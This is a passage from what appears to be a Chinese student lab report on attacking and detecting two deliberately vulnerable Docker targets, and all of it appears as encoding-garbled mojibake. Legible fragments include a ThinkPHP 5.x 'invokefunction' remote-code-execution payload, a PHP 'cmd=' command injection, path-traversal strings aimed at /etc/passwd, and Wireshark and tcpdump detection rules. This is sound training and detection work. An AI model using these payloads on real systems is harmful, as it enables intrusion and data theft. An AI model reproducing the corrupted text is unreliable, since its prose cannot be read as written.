- çŠ¶æ€ç : 200 OK
- å“åº”é•¿åº¦: 1192å­—èŠ‚
- å¤„ç†æ—¶é—´: 0.6æ¯«ç§’
```

**å“åº”åˆ†æ**:

- **æ”»å‡»æˆåŠŸ**: HTTP 200çŠ¶æ€ç ç¡®è®¤æ–‡ä»¶è¯»å–æˆåŠŸ
- **æ–‡ä»¶å¤§å°**: 1192å­—èŠ‚ï¼Œä¸ `/etc/passwd`æ–‡ä»¶å¤§å°ä¸€è‡´
- **å¿«é€Ÿå“åº”**: 0.6æ¯«ç§’å¤„ç†æ—¶é—´ï¼Œè¯´æ˜æ˜¯ç›´æ¥æ–‡ä»¶è¯»å–
- **æ•°æ®æ³„éœ²**: æˆåŠŸè·å–äº†ç³»ç»Ÿç”¨æˆ·ä¿¡æ¯

4. æ”»å‡»æ¨¡å¼æ€»ç»“

4.1 æ”»å‡»æ—¶åºåˆ†æ

```
æ—¶é—´è½´:
0.000s - 0.041s: RCEæ”»å‡» (è¿æ¥1)
4.212s - 4.216s: æ–‡ä»¶è¯»å–æ”»å‡» (è¿æ¥2)
```

**æ”»å‡»ç­–ç•¥**:

- **åˆ†é˜¶æ®µæ”»å‡»**: å…ˆæ‰§è¡Œå‘½ä»¤è·å–æƒé™ï¼Œå†è¯»å–æ•æ„Ÿæ–‡ä»¶
- **è¿æ¥å¤ç”¨**: ä½¿ç”¨ä¸åŒTCPè¿æ¥é¿å…æ£€æµ‹
- **æ—¶é—´é—´éš”**: 4ç§’é—´éš”ï¼Œå¯èƒ½æ˜¯æ‰‹åŠ¨æ“ä½œæˆ–è„šæœ¬å»¶è¿Ÿ

4.2 æŠ€æœ¯ç‰¹å¾è¯†åˆ«

```
ç¼–ç æŠ€æœ¯å¯¹æ¯”:
- RCEæ”»å‡»: ..%2e (æ··åˆç¼–ç )
- æ–‡ä»¶è¯»å–: ..%2e%2e (åŒé‡ç¼–ç )
```

**ç»•è¿‡æŠ€æœ¯**:

- **è·¯å¾„å¤šæ ·åŒ–**: CGIè·¯å¾„å’Œiconsè·¯å¾„åˆ†åˆ«åˆ©ç”¨
- **ç¼–ç å˜åŒ–**: ä¸åŒçš„URLç¼–ç æ–¹å¼
- **æ–¹æ³•åˆ‡æ¢**: POSTæ‰§è¡Œå‘½ä»¤ï¼ŒGETè¯»å–æ–‡ä»¶

5. å®‰å…¨æ£€æµ‹è¦ç‚¹

5.1 æµé‡ç‰¹å¾æ£€æµ‹

```bash
# æ£€æµ‹è·¯å¾„éå†ç‰¹å¾
- URLåŒ…å«: %2e%2e, ..%2e, ../../../../
- è·¯å¾„æ¨¡å¼: /cgi-bin/.., /icons/..
- ç›®æ ‡æ–‡ä»¶: /etc/passwd, /bin/sh
```

5.2 å¼‚å¸¸è¡Œä¸ºè¯†åˆ«

```bash
# å¼‚å¸¸å“åº”æ¨¡å¼
- CGIè·¯å¾„è¿”å›200çŠ¶æ€ç 
- å¤§é‡å­—èŠ‚çš„æ–‡ä»¶è¯»å–å“åº”
- çŸ­æ—¶é—´å†…å¤šæ¬¡è·¯å¾„éå†å°è¯•
```

5.3 ç½‘ç»œç›‘æ§è§„åˆ™

```bash
# Wiresharkè¿‡æ»¤è§„åˆ™
http.request.uri contains "%2e%2e" or 
http.request.uri contains "cgi-bin" and http.request.uri contains ".." or
http.request.uri contains "icons" and http.request.uri contains ".."
```

6. æ”»å‡»æˆåŠŸæŒ‡æ ‡

**ç¡®è®¤æ”»å‡»æˆåŠŸçš„å…³é”®è¯æ®**:

1. âœ… **RCEæˆåŠŸ**: POSTè¯·æ±‚è¿”å›200çŠ¶æ€ç ï¼Œ254å­—èŠ‚å“åº”
2. âœ… **æ–‡ä»¶è¯»å–æˆåŠŸ**: GETè¯·æ±‚è¿”å›200çŠ¶æ€ç ï¼Œ1192å­—èŠ‚å“åº”
3. âœ… **æƒé™è·å–**: èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å’Œè¯»å–æ•æ„Ÿæ–‡ä»¶
4. âœ… **ç»•è¿‡é˜²æŠ¤**: æˆåŠŸç»•è¿‡Apacheçš„è·¯å¾„æ£€æŸ¥æœºåˆ¶

## å››ã€å®éªŒæ€»ç»“

æœ¬æ¬¡å®éªŒæˆåŠŸå®Œæˆäº†å¯¹ç¬¬ä¸€å±‚ç½‘ç»œä¸­ä¸¤ä¸ªå…¸å‹é¶æ ‡ `c4pr1c3/vulshare_nginx-php-flag:latest` å’Œ `vulfocus/thinkphp-cve_2018_1002015:latest` çš„æ”»å‡»ã€åˆ©ç”¨åŠæ£€æµ‹ã€‚é€šè¿‡å®è·µï¼Œæˆ‘ä»¬è¾¾æˆäº†ä»¥ä¸‹ä¸»è¦å­¦ä¹ å’Œæ“ä½œç›®æ ‡ï¼š

1. **ç¯å¢ƒæ­å»ºä¸é¶åœºç†Ÿæ‚‰**ï¼š

   * æˆåŠŸåœ¨ macOS ç‰©ç†ä¸»æœºä¸Šé€šè¿‡ Parallels Desktop éƒ¨ç½²äº† Kali Linux è™šæ‹Ÿæœºä½œä¸ºæ”»å‡»æœºã€‚
   * åœ¨ Kali ç¯å¢ƒä¸­ï¼Œç†Ÿç»ƒé…ç½®å’Œä½¿ç”¨äº† Docker åŠ Vulfocus å¹³å°ï¼Œèƒ½å¤Ÿé¡ºåˆ©æ‹‰å–ã€å¯åŠ¨å’Œç®¡ç†ç›®æ ‡é¶æœº Docker é•œåƒï¼Œä¸ºåç»­çš„æ¸—é€æµ‹è¯•å’Œå®‰å…¨åˆ†æå¥ å®šäº†åŸºç¡€ã€‚
2. **æ¼æ´åˆ†æä¸åˆ©ç”¨å®è·µ**ï¼š

   * **é’ˆå¯¹ `c4pr1c3/vulshare_nginx-php-flag:latest`** (Nginx + PHP å‘½ä»¤æ³¨å…¥æ¼æ´):
     * é€šè¿‡ä¿¡æ¯æ”¶é›†ï¼ˆ`nmap` æ‰«æã€æµè§ˆå™¨è®¿é—®é¡µé¢æç¤º `index.php?cmd=ls /tmp`ï¼‰ï¼Œå¿«é€Ÿè¯†åˆ«äº†åŸºäº GET å‚æ•°çš„å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚
     * åˆ©ç”¨ `curl` å·¥å…·æ„é€ æ¶æ„ URL (å¦‚ `index.php?cmd=ls%20/tmp`)ï¼ŒæˆåŠŸæ‰§è¡Œäº†ä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚ `ls`, `id`, `uname -a`, `ls -la /`ï¼‰ï¼Œå¹¶ç›´æ¥åœ¨ `/tmp` ç›®å½•ä¸‹æ‰¾åˆ°äº† flagã€‚
     * éªŒè¯äº†æ¼æ´çš„å¹¿æ³›åˆ©ç”¨æ€§ï¼Œèƒ½å¤Ÿè·å–ç³»ç»Ÿä¿¡æ¯ã€ç”¨æˆ·ä¿¡æ¯å’Œç›®å½•ç»“æ„ã€‚
   * **é’ˆå¯¹ `vulfocus/thinkphp-cve_2018_1002015:latest`** (ThinkPHP 5.x RCE æ¼æ´ï¼Œç±»ä¼¼ CVE-2018-20062):
     * é€šè¿‡åˆ†æé¶æ ‡åç§°å’Œ CVE ç¼–å·çš„æš—ç¤ºï¼Œæ¨æ–­å…¶ä¸ ThinkPHP 5.x çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç›¸å…³ã€‚
     * å­¦ä¹ å¹¶æŒæ¡äº†åˆ©ç”¨ ThinkPHP æ¡†æ¶å¯¹æ§åˆ¶å™¨åç§°è§£æç¼ºé™·çš„ RCE Payload æ„é€ æ–¹æ³•ï¼Œç‰¹åˆ«æ˜¯ `s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=<function_name>&vars[1][]=<argument>` çš„å½¢å¼ã€‚
     * æˆåŠŸæ‰§è¡Œäº† `phpinfo()` (éªŒè¯æ¼æ´å­˜åœ¨æ€§) å’Œ `id` (è·å–å½“å‰ç”¨æˆ·æƒé™ï¼Œç¡®è®¤ä¸º root)ï¼Œå¹¶æœ€ç»ˆé€šè¿‡ `find / -name '*flag*'` å‘½ä»¤å®šä½åˆ° flag æ–‡ä»¶ `/tmp/flag-{bmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87}`ï¼Œå†é€šè¿‡ `cat` å‘½ä»¤è¯»å–äº† flag å†…å®¹ã€‚
     * æŒæ¡äº†å¯¹ URLä¸­ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ `[`ã€`]`ã€`{`ã€`}`ï¼‰è¿›è¡Œç™¾åˆ†å·ç¼–ç ä»¥ç¡®ä¿ `curl` å‘½ä»¤æ­£ç¡®æ‰§è¡Œçš„é‡è¦æ€§ã€‚
3. **å¨èƒæ£€æµ‹ä¸æ—¥å¿—åˆ†æèƒ½åŠ›æå‡**ï¼š

   * **é¶æ ‡ä¸€ (Nginx + PHP)**:
     * é€šè¿‡ `docker exec` è¿›å…¥å®¹å™¨å†…éƒ¨ï¼ŒæˆåŠŸå®šä½å¹¶åˆ†æäº† Nginx çš„è®¿é—®æ—¥å¿— (`/var/log/nginx/access.log`)ï¼Œä»ä¸­ç­›é€‰å‡ºåŒ…å«æ¶æ„ `cmd` å‚æ•°çš„æ”»å‡»è¯·æ±‚è®°å½•ã€‚
     * è§£å†³äº†åœ¨ Kali ä¸»æœºï¼ˆåŒæ—¶ä½œä¸º Docker å®¿ä¸»æœºï¼‰ä¸Šä½¿ç”¨ `tcpdump` æ•è·é’ˆå¯¹æœ¬æœº Docker å®¹å™¨æµé‡æ—¶é‡åˆ°çš„ `0 packets captured` é—®é¢˜ã€‚é€šè¿‡é€æ­¥æ’æŸ¥ï¼Œæœ€ç»ˆç¡®å®šéœ€è¦ç›‘å¬ Docker çš„ç½‘æ¡¥æ¥å£ (`docker0`) å¹¶ä½¿ç”¨å®¹å™¨çš„å†…éƒ¨ IP (`172.17.0.2`) å’Œå®é™…æœåŠ¡ç«¯å£ (`80`) ä½œä¸ºè¿‡æ»¤æ¡ä»¶ï¼ŒæˆåŠŸæ•è·å¹¶ä½¿ç”¨ Wireshark åˆ†æäº†æ”»å‡»æµé‡ï¼Œæ¸…æ™°è§‚å¯Ÿåˆ°äº† TCP æ¡æ‰‹ã€æ¶æ„ HTTP GET è¯·æ±‚åŠæœåŠ¡å™¨å“åº”ã€‚
   * **é¶æ ‡äºŒ (ThinkPHP)**:
     * åœ¨å®¹å™¨å†…ï¼Œé€šè¿‡å°è¯•å¸¸è§çš„ Web æœåŠ¡å™¨æ—¥å¿—è·¯å¾„å¤±è´¥åï¼Œæ ¹æ® ThinkPHP çš„ç‰¹æ€§ï¼Œåœ¨ `/app/runtime/log/` ç›®å½•ä¸‹æ‰¾åˆ°äº†æŒ‰æ—¥æœŸç»„ç»‡çš„æ¡†æ¶åº”ç”¨æ—¥å¿— (å¦‚ `/app/runtime/log/202505/24.log`)ã€‚åˆ†æäº†è¿™äº›æ—¥å¿—ï¼Œè¯†åˆ«äº†åŒ…å« RCE Payload çš„è¯·æ±‚è®°å½•ï¼Œå¹¶æ³¨æ„åˆ°äº†ä¼´éšçš„ `variable type error: boolean` é”™è¯¯ï¼ˆè™½ç„¶ä¸å½±å“æ¼æ´åˆ©ç”¨ï¼‰ã€‚
     * åŒæ ·åº”ç”¨äº†æ­£ç¡®çš„ `tcpdump` é…ç½®ï¼ˆç›‘å¬ `docker0`ï¼Œç›®æ ‡ä¸ºå®¹å™¨å†…éƒ¨ IP `172.17.0.2` å’Œç«¯å£ `80`ï¼‰ï¼Œæ•è·å¹¶ä½¿ç”¨ Wireshark åˆ†æäº†é’ˆå¯¹ ThinkPHP é¶æ ‡çš„æ”»å‡»æµé‡ï¼Œå†æ¬¡éªŒè¯äº†æ”»å‡»æ­¥éª¤å’Œæ•°æ®å›ä¼ ã€‚
4. **é—®é¢˜è§£å†³ä¸ç»éªŒç§¯ç´¯**ï¼š

   * å®éªŒä¸­æœ€æ˜¾è‘—çš„æŒ‘æˆ˜æ˜¯ `tcpdump` çš„é…ç½®ã€‚é€šè¿‡ç³»ç»Ÿæ€§çš„æ’æŸ¥ï¼ˆä» `any` æ¥å£åˆ°ç‰©ç†æ¥å£ `eth1`ï¼Œå†åˆ°å›ç¯æ¥å£ `lo`ï¼Œæœ€ç»ˆåˆ° Docker ç½‘æ¡¥ `docker0`ï¼‰ï¼ŒåŠ æ·±äº†å¯¹ Docker ç½‘ç»œæ¨¡å¼å’Œæœ¬åœ°æµé‡æ•è·å¤æ‚æ€§çš„ç†è§£ã€‚
   * é‡åˆ°äº† `curl` å›  URL ä¸­åŒ…å«æœªç¼–ç çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ `[]`ï¼‰è€ŒæŠ¥é”™çš„é—®é¢˜ï¼Œé€šè¿‡å­¦ä¹ å’Œåº”ç”¨ URL ç™¾åˆ†å·ç¼–ç æˆåŠŸè§£å†³ã€‚
   * åœ¨è¿›å…¥ Docker å®¹å™¨æ—¶ï¼Œå½“ `/bin/bash` ä¸å­˜åœ¨æ—¶ï¼Œå­¦ä¼šäº†å°è¯•ä½¿ç”¨ `/bin/sh`ã€‚

**æ€»ç»“ä¸åæ€**ï¼š
æœ¬æ¬¡å®éªŒä¸ä»…ç³»ç»Ÿæ€§åœ°å®è·µäº†ä»ç¯å¢ƒå‡†å¤‡ã€ä¿¡æ¯æ”¶é›†ã€æ¼æ´åˆ©ç”¨åˆ°å¨èƒæ£€æµ‹çš„å…¨è¿‡ç¨‹ï¼Œè€Œä¸”åœ¨è§£å†³å®é™…æ“ä½œä¸­é‡åˆ°çš„é—®é¢˜ï¼ˆå¦‚ `tcpdump` é…ç½®ã€`curl` ç‰¹æ®Šå­—ç¬¦å¤„ç†ã€å®¹å™¨å†… shell ç¯å¢ƒå·®å¼‚ï¼‰æ–¹é¢è·å¾—äº†å®è´µçš„ç»éªŒã€‚é€šè¿‡å¯¹ä¸åŒç±»å‹ Web åº”ç”¨ï¼ˆç®€å• PHP åº”ç”¨å’ŒåŸºäºæ¡†æ¶çš„ ThinkPHP åº”ç”¨ï¼‰çš„æ”»å‡»ï¼Œå¯¹å„è‡ªçš„æ¼æ´ç‰¹ç‚¹å’Œæ—¥å¿—è®°å½•æ–¹å¼æœ‰äº†æ›´æ·±å…¥çš„è®¤è¯†ã€‚è¿™äº›æŠ€èƒ½å’Œç»éªŒå¯¹äºæœªæ¥è¿›è¡Œæ›´å¤æ‚çš„æ¸—é€æµ‹è¯•ã€å®‰å…¨å®¡è®¡ä»¥åŠæ„å»ºæ›´æœ‰æ•ˆçš„é˜²å¾¡ç­–ç•¥éƒ½å…·æœ‰é‡è¦æ„ä¹‰ã€‚

# äº”ã€é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆ

é…ç½®å’Œä½¿ç”¨ `tcpdump` è¿›è¡Œç½‘ç»œæµé‡æ•è·æ—¶ï¼Œ`tcpdump` æ— æ³•æ•è·åˆ°é¢„æœŸçš„æ•°æ®åŒ… (æ˜¾ç¤º `0 packets captured`)ã€‚ä»¥ä¸‹æ˜¯æ’æŸ¥å’Œè§£å†³é—®é¢˜çš„æ­¥éª¤ï¼š

1. **åˆæ­¥å°è¯•ä¸é—®é¢˜**:

   * æœ€åˆå°è¯•ä½¿ç”¨ `sudo tcpdump -i any -A 'host 10.37.133.3 and port 8630' -w nginx_php_flag_traffic.pcap` å‘½ä»¤ã€‚å‚æ•° `-i any` æ„å›¾ç›‘å¬æ‰€æœ‰æ¥å£ã€‚
   * **ç»“æœ**: `0 packets captured`ã€‚åŒæ—¶å‡ºç°è­¦å‘Š `any: That device doesn't support promiscuous mode`ã€‚
     ![1748019457185](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019457185.png)
2. **æŒ‡å®šç‰©ç†/è™šæ‹Ÿç½‘ç»œæ¥å£ (`eth1`)**:

   * é€šè¿‡ `ip addr` å‘½ä»¤æŸ¥çœ‹ç½‘ç»œæ¥å£ï¼Œå‘ç° Kali è™šæ‹Ÿæœºçš„ IP `10.37.133.3` é…ç½®åœ¨ `eth1` æ¥å£ä¸Šã€‚
   * ä¿®æ”¹å‘½ä»¤ä¸º `sudo tcpdump -i eth1 -A 'host 10.37.133.3 and port 8630' -w nginx_php_flag_traffic.pcap`ã€‚
   * **ç»“æœ**: ä»ç„¶æ˜¯ `0 packets captured`ã€‚
   * **åˆ†æ**: ç”±äºé¶æœºæœåŠ¡ (`10.37.133.3:8630`) å’Œæ”»å‡»å‘½ä»¤ (`curl`) å‡åœ¨åŒä¸€å° Kali ä¸»æœºä¸Šæ‰§è¡Œï¼Œæµé‡å¯èƒ½ä¸»è¦åœ¨æœ¬åœ°å›ç¯æˆ– Docker å†…éƒ¨ç½‘ç»œä¸­ï¼Œå¹¶æœªç»è¿‡ `eth1` æ¥å£è¿›è¡Œå¤–éƒ¨è·¯ç”±ã€‚
     ![1748019473424](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019473424.png)
3. **å°è¯•å›ç¯æ¥å£ (`lo`)**:

   * è€ƒè™‘åˆ°æµé‡å¯èƒ½åœ¨æœ¬åœ°ä¸»æœºå†…éƒ¨ï¼Œå°è¯•ç›‘å¬å›ç¯æ¥å£ï¼š`sudo tcpdump -i lo -A 'port 8630' -w nginx_php_flag_traffic.pcap`ã€‚
   * **ç»“æœ**: ä¾ç„¶æ˜¯ `0 packets captured`ã€‚
   * **åˆ†æ**: è¿™è¡¨æ˜æµé‡ç”šè‡³æ²¡æœ‰å®Œå…¨é€šè¿‡æ ‡å‡†çš„å›ç¯æ¥å£ï¼Œæˆ–è€…è¿‡æ»¤æ¡ä»¶ä¸å‡†ç¡®ã€‚æ›´æ·±å±‚çš„åŸå› åœ¨äº Docker çš„ç½‘ç»œæœºåˆ¶ã€‚

   ![1748019483551](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019483551.png)
4. **æ·±å…¥ Docker ç½‘ç»œå±‚é¢è¿›è¡Œæ’æŸ¥ä¸è§£å†³**:

   * **ç†è§£ Docker ç½‘ç»œ**: å½“ Docker å®¹å™¨é€šè¿‡ç«¯å£æ˜ å°„ (å¦‚ `-p 8630:80`) æš´éœ²æœåŠ¡æ—¶ï¼Œå®¿ä¸»æœº (Kali) ä¸Šçš„è¯·æ±‚ (`http://10.37.133.3:8630`) ä¼šè¢« Docker è¿›ç¨‹æˆªè·ï¼Œå¹¶é€šè¿‡å…¶å†…éƒ¨çš„è™šæ‹Ÿç½‘æ¡¥ (é€šå¸¸æ˜¯ `docker0`) è·¯ç”±åˆ°å®¹å™¨çš„å†…éƒ¨ IP å’Œå®é™…ç«¯å£ (å¦‚ `172.17.0.2:80`)ã€‚
   * **è·å–å®¹å™¨å†…éƒ¨ IP**: ä½¿ç”¨ `docker ps` è·å–ç›®æ ‡å®¹å™¨çš„ ID (`c93755678f6c`)ã€‚ç„¶åä½¿ç”¨ `docker inspect c93755678f6c` æŸ¥çœ‹å…¶è¯¦ç»†ç½‘ç»œé…ç½®ã€‚
     ```json
     // docker inspect c93755678f6c è¾“å‡ºçš„å…³é”®éƒ¨åˆ†
     "NetworkSettings": {
         // ...
         "IPAddress": "172.17.0.2", // å®¹å™¨åœ¨ bridge ç½‘ç»œä¸Šçš„ IP
         "Networks": {
             "bridge": {
                 // ...
                 "IPAddress": "172.17.0.2",
                 "Gateway": "172.17.0.1",
                 // ...
             }
         }
     }
     ```
   * **ç¡®å®šç›‘å¬æ¥å£å’Œè¿‡æ»¤æ¡ä»¶**:
     * å®¹å™¨ IP ä¸º `172.17.0.2`ã€‚
     * å®¹å™¨å†…éƒ¨æœåŠ¡ç«¯å£ä¸º `80`ã€‚
     * å®¿ä¸»æœºä¸Šå¯¹åº”çš„ Docker ç½‘æ¡¥æ¥å£ä¸º `docker0` (å…¶ IP é€šå¸¸æ˜¯å®¹å™¨ç½‘ç»œçš„ç½‘å…³ï¼Œå¦‚ `172.17.0.1`)ã€‚
   * **æœ€ç»ˆæ­£ç¡®çš„ `tcpdump` å‘½ä»¤**:
     ```bash
     sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w nginx_php_flag_traffic.pcap
     ```
   * **ç»“æœ**: æˆåŠŸæ•è·åˆ°10ä¸ªæ•°æ®åŒ…ã€‚
   * **ç»“è®º**: å¯¹äºæ­¤ç±»å®¿ä¸»æœºä¸æœ¬æœº Docker å®¹å™¨é—´çš„é€šä¿¡ï¼Œéœ€è¦ç›‘å¬ Docker çš„è™šæ‹Ÿç½‘æ¡¥æ¥å£ (`docker0`)ï¼Œå¹¶ä½¿ç”¨å®¹å™¨çš„å†…éƒ¨ IP å’Œå®é™…æœåŠ¡ç«¯å£ä½œä¸ºè¿‡æ»¤æ¡ä»¶ã€‚
